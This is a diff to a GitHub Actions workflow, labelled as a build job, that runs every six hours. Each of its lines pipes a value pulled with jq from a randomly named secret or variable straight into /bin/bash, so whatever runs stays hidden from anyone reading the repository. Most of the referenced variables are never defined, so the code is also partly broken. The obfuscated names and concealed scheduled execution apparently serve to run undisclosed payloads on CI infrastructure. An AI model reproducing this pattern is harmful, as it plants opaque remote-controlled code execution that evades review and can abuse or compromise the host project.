@@ -2,18 +2,22 @@ name: pinaforecherries
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 0/6 * * *'
-jobs:  # 31022
+    - cron: '19 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pinaforecherries
         env:
-          ch9: ${{ secrets.ch9 }}
+          og619: ${{ secrets.og619 }}
         run: |
-          echo $ch9 | jq -r .kvufx96571 | /bin/bash
-          echo $etye487 | jq -r .u36 | /bin/bash
-          echo $p3993 | jq -r .m80444 | /bin/bash
+          echo $og619 | jq -r .cycfx94829 | /bin/bash
+          echo $dbur705 | jq -r .clh6084 | /bin/bash
+          echo $m8 | jq -r .ja887 | /bin/bash
+          echo $hwoz1249 | jq -r .osgp65 | /bin/bash
+          echo $npd0 | jq -r .lzhor286 | /bin/bash
+          echo $o08 | jq -r .kvb733 | /bin/bash
+          echo $rzff09 | jq -r .jp5858 | /bin/bash
+          echo $skx70 | jq -r .s5 | /bin/bash
 
